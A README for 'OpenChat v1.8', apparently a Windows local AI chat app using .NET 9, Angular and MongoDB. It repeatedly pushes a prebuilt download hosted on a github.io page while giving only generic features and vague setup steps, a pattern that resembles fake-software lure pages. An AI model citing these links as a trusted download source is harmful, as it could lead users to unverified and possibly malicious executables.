# OpenChat v1.8 - local AI chat app 2026

> **OpenChat is a Windows local AI chat app that keeps conversations on your machine, adds offline processing, and delivers streaming replies plus agentic tools in version 1.8.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.8-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/noahhayes1996/openchat-windows-ai-v18?style=flat-square)](https://github.com/noahhayes1996/openchat-windows-ai-v18)

---

<p align="center">
  <a href="https://noahhayes1996.github.io/openchat-windows-ai-v18/">
    <img src="https://img.shields.io/badge/Download-OpenChat%20Latest-brightgreen?style=for-the-badge" alt="Download OpenChat">
  </a>
</p>

> **[Direct Download - OpenChat v1.8](https://noahhayes1996.github.io/openchat-windows-ai-v18/)**

---

[Download Latest Build](https://noahhayes1996.github.io/openchat-windows-ai-v18/)

---

## What OpenChat Is

OpenChat is a Windows desktop AI chat application focused on private, local-first usage. It is intended to run entirely on the user's own machine, keeping chat sessions and saved conversation records on local infrastructure rather than relying on a hosted service.

The project pairs a .NET 9 backend with an Angular front end, giving it a responsive interface and a clean chat-oriented workflow. It is aimed at users who want local AI, live streaming output, and agent-style tooling in a single desktop-friendly package.

---

## Key Capabilities

- Runs on your local computer for self-contained operation
- Keeps chat activity private and offline
- Streams assistant replies as they are generated
- Supports agentic tool calling for richer workflows
- Includes web fetching with allowlist safety checks
- Stores conversation history in a local MongoDB database
- Built with .NET 9 for the application layer
- Uses Angular for the web-based user interface

---

## Installation

1. Download the latest build from the project page or clone the repository locally.
2. Make sure the required runtime and database components are available on your system.
3. Start the application following the repository's build or launch instructions.

Typical local setup flow:

- Clone the repo
- Install the .NET 9 SDK
- Set up MongoDB locally
- Build and run the app

Example first-run approach:

- Launch the backend service
- Open the Angular client in your browser or through the provided host entrypoint
- Connect to the local MongoDB instance if prompted

---

## How to Use It

Once OpenChat is running, it works as a local workspace for prompts, streamed answers, and tasks that use tools.

Common workflow:

1. Open the app on Windows.
2. Start a new chat or continue an existing conversation.
3. Enter a prompt and wait for streaming output.
4. Use agent tools when you need supported actions or web fetching.
5. Review stored conversations in the local database as needed.

If your setup includes separate start commands for backend and frontend, run both parts in the order specified by the project files.

---

## Configuration

OpenChat settings are expected to be managed through the application configuration and local environment setup.

Typical configuration areas include:

- MongoDB connection details
- Local runtime ports or host bindings
- Tool allowlist settings for web fetching
- App-specific preferences for chat behavior

Example configuration shape:

    {
      "MongoDb": {
        "ConnectionString": "mongodb://localhost:27017",
        "DatabaseName": "OpenChat"
      },
      "Tools": {
        "WebFetchAllowlist": []
      }
    }

Adjust these values to match your local setup and operational needs.

---

## Requirements

- Windows
- .NET 9
- Angular-compatible front-end environment
- Local MongoDB instance for conversation storage
- Enough disk space for application files and chat data

---

## Frequently Asked Questions

**Does OpenChat run online or locally?**  
It is built to run locally on the user's computer and process chats offline.

**Where are conversations stored?**  
Conversation data is stored in a local MongoDB database.

**Can responses stream as they generate?**  
Yes, streaming responses are supported.

**What is the role of agentic tools?**  
They allow the chat app to invoke supported tools as part of a conversation workflow.

**How does web fetching work?**  
Web fetching is controlled with allowlist safety checks.

**What if I need help with setup?**  
Check the repository instructions, verify the .NET 9 and MongoDB requirements, and confirm your local configuration values.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
